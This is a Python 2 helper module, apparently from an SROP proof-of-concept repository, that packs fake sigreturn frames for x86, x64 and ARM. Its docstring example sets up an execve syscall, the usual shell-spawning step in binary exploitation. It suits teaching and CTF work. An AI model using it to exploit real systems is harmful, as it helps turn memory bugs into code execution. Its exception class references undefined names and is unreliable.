'''
from https://github.com/eQu1NoX/srop-poc/blob/master/Frame.py

example::

syscall = 0x40056f

frame = srop(arch="x64")
frame.set("rax", 0x3b)
frame.set("rdi", 0x601040)
frame.set("rsi", 0x0)
frame.set("rdx", 0x1)
frame.set("rsp", 0x601040)
frame.set("rbp", 0x601050)
frame.set("rip", syscall)
srop = frame.get_srop()
'''

import struct
import string

caps = string.letters[26:]
lower = string.letters[:26]

registers_32 = ["gs",   "fs",  "es",  "ds",   "edi",  "esi", "ebp", "esp", "ebx",
             "edx",  "ecx", "eax", "JUNK", "JUNK", "eip", "cs",  "eflags",
             "JUNK", "ss",  "floa"]

registers_64 = ["uc_flags", "&uc", "uc_stack.ss_sp", "uc_stack.ss_flags", "uc_stack.ss_size",
                "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15", "rdi", "rsi", "rbp",
                "rbx", "rdx", "rax", "rcx", "rsp", "rip", "eflags", "csgsfs", "err", "trapno",
                "oldmask", "cr2", "&fpstate", "__reserved", "sigmask"]

registers_arm = ["uc_flags", "uc_link", "uc_stack.ss_sp", "uc_stack.ss_flags", "uc_stack.ss_size",
		 "trap_no", "error_code", "oldmask", "r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7",
		 "r8", "r9", "r10", "fp", "ip", "sp", "lr", "pc", "cpsr", "fault_address", "uc_sigmask",
		 "__unused", "uc_regspace"]

reg_pos_mapping_x86 = {}
for pos, reg in enumerate(registers_32):
    reg_pos_mapping_x86[reg] = pos

reg_pos_mapping_x64 = {}
for pos, reg in enumerate(registers_64):
    reg_pos_mapping_x64[reg] = pos

reg_pos_mapping_arm = {}
for pos, reg in enumerate(registers_arm):
    reg_pos_mapping_arm[reg] = pos


class ValueException(Exception):
    def __init__(self, register, value):
        self.value = value
    def __str__(self):
        return "Register: %s Value: %d" %(register, value)

class srop(object):
    def __init__(self, arch="x86"):
        self.arch  = arch
        self.frame = []
        self.initialize_vals()

    def initialize_vals(self):
        if self.arch == "x86":
            self._initialize_x86()
        elif self.arch == "x64":
            self._initialize_x64()
        elif self.arch == "arm":
            self._initialize_arm()

    def _initialize_arm(self):
        for i in range(len(registers_arm)):
            self.frame.append(struct.pack("<I", 0x0))

    def _set_arm(self, reg, val):
        index = reg_pos_mapping_arm[reg]
        value = struct.pack("<I", val)
        self.frame[index] = value

    def _initialize_x64(self):
        for i in range(len(registers_64)):
            self.frame.append(struct.pack("<Q", 0x0))
        self.set("csgsfs", 0x33)
        self.set("&fpstate", 0x0)
        self.set("__reserved", 0x0)

    def _set_x64(self, reg, val):
        index = reg_pos_mapping_x64[reg]
        value = struct.pack("<Q", val)
        self.frame[index] = value

    def _initialize_x86(self):
        for i in range(len(registers_32)):
            self.frame.append(struct.pack("<I", 0x0))
        self.set("cs", 0x73)
        self.set("ss", 0x7b)

    def set(self, reg, val):
        if self.arch == "x86":
            self._set_x86(reg, val)
        elif self.arch == "x64":
            self._set_x64(reg, val)
        elif self.arch == "arm":
            self._set_arm(reg, val)

    def _set_x86(self, reg, val):
        index = reg_pos_mapping_x86[reg]
        value = struct.pack("<I", val)
        if reg == "ss":
            value = struct.pack("<h", val) + "\x00\x00"
        self.frame[index] = value

    def get_srop(self):
        frame_contents = ''.join(self.frame)
        if self.arch == "x86":
            assert len(frame_contents) == len(registers_32) * 4
        elif self.arch == "x64":
            assert len(frame_contents) == len(registers_64) * 8
        elif self.arch == "arm":
            assert len(frame_contents) == len(registers_arm) * 4
        return frame_contents
